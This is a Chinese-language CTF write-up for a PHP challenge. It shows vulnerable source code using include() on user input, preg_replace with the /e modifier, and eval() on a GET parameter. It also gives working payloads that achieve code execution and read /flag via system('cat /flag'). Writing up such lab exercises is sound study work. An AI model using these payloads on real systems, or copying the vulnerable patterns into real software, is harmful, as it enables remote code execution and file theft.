# 知识点：

# 1. php伪协议

# 2. 文件包含

# 3. preg_replace命令执行



参考链接：

https://xz.aliyun.com/t/2557



# 1. 打开题目发现和zjctf2019的逆转思维很像



index直接给出源码：

```javascript
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```



payload:

```javascript
get:
    
```



得到next.php的源码：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/0822C02484FA4C07861FE2259A92A945clipboard.png)



```javascript
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
    @eval($_GET['cmd']);
}
```



# 2. 接下来就和zjctf2019的题不一样

需要使用preg_replace()函数的命令执行



参考：https://xz.aliyun.com/t/2557

payload:

```javascript
/next.php?\S*={${phpinfo()}}
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/4B66A5A6EC544EF4A3C684FBE5AD3741clipboard.png)



# 3. 接下来就需要调用next的getFlag函数进行，命令执行

注意：eval函数只是能够执行其他函数，并不能执行系统命令，例如cat，所以需要借助system函数

其实eval函数的原理就是将字符串，拼接到源代码中。

```javascript
/next.php?\S*={${getFlag()}}&cmd=system('cat%20/flag');
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/970505B5B99549B58E625645CE63749Bclipboard.png)



也可以不使用getFlag函数

```javascript
get:
    /next.php?\S*=${eval($_POST[a])}
post:
    a=system("cat /flag");
```

